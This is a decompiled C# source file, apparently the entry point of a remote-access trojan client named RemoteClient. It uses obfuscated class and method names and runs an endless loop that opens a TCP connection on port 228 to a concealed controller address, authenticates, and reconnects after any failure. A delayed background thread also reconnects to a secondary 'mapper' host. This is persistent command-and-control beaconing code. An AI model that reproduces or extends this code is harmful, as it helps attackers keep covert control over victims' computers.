using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using RemoteClient.nagruz;
using RemoteClient.Polices;
using RemoteClient.Schemes;
using sdfsdf.Resolver;

namespace RemoteClient
{
	// Token: 0x02000022 RID: 34
	public static class Program
	{
		// Token: 0x0600009D RID: 157 RVA: 0x00004590 File Offset: 0x00002790
		[STAThread]
		public static void Main(string[] args)
		{
			Application.EnableVisualStyles();
			Application.SetCompatibleTextRenderingDefault(false);
			InvocationProcessPolicy.CompareError();
			Application.Run(new sdfsdfdsg());
			new Thread(new ThreadStart(Program.ParameterInterpreterModel.visitor.RestartMapper)).Start();
			while (Program.needReconnect)
			{
				if (MapperProductSchema.mapper == "")
				{
					try
					{
						Program._Args = args;
						Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
						socket.Connect(new IPEndPoint(IPAddress.Parse(MapperProductSchema.m_Context), 228));
						Product.tests = new RemoteClient(socket);
						Product.tests.Auth();
						while (Product.tests.clientState)
						{
							Thread.Sleep(1000);
						}
						Thread.Sleep(5000);
						Product.tests = null;
						continue;
					}
					catch
					{
						Thread.Sleep(new Random().Next(1000, 3000));
						continue;
					}
				}
				try
				{
					Program._Args = args;
					Socket socket2 = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
					socket2.Connect(new IPEndPoint(IPAddress.Parse(MapperProductSchema.mapper), 228));
					Product.tests = new RemoteClient(socket2);
					Product.tests.Auth();
					while (Product.tests.clientState)
					{
						Thread.Sleep(1000);
					}
					Thread.Sleep(5000);
					Product.tests = null;
				}
				catch
				{
					Thread.Sleep(new Random().Next(1000, 3000));
					MapperProductSchema.mapper = "";
				}
			}
		}

		// Token: 0x04000070 RID: 112
		public static bool needReconnect = true;

		// Token: 0x04000071 RID: 113
		public static string[] _Args;

		// Token: 0x04000072 RID: 114
		public static byte[] id = Encoding.ASCII.GetBytes(Path.GetRandomFileName() + Path.GetRandomFileName());

		// Token: 0x04000073 RID: 115
		public static int rtt = 0;

		// Token: 0x02000023 RID: 35
		[CompilerGenerated]
		[Serializable]
		private sealed class ParameterInterpreterModel
		{
			// Token: 0x0600009F RID: 159 RVA: 0x0000259F File Offset: 0x0000079F
			// Note: this type is marked as 'beforefieldinit'.
			static ParameterInterpreterModel()
			{
				InvocationProcessPolicy.CompareError();
				Program.ParameterInterpreterModel.visitor = new Program.ParameterInterpreterModel();
			}

			// Token: 0x060000A0 RID: 160 RVA: 0x00002297 File Offset: 0x00000497
			public ParameterInterpreterModel()
			{
				InvocationProcessPolicy.CompareError();
				base..ctor();
			}

			// Token: 0x060000A1 RID: 161 RVA: 0x0000473C File Offset: 0x0000293C
			internal void RestartMapper()
			{
				Thread.Sleep(120000);
				try
				{
					if (!TokenizerParserResolver.GetMapper())
					{
						TokenizerParserResolver.ConnectMapper();
					}
				}
				catch
				{
				}
			}

			// Token: 0x04000074 RID: 116
			public static readonly Program.ParameterInterpreterModel visitor;

			// Token: 0x04000075 RID: 117
			public static ThreadStart test;
		}
	}
}
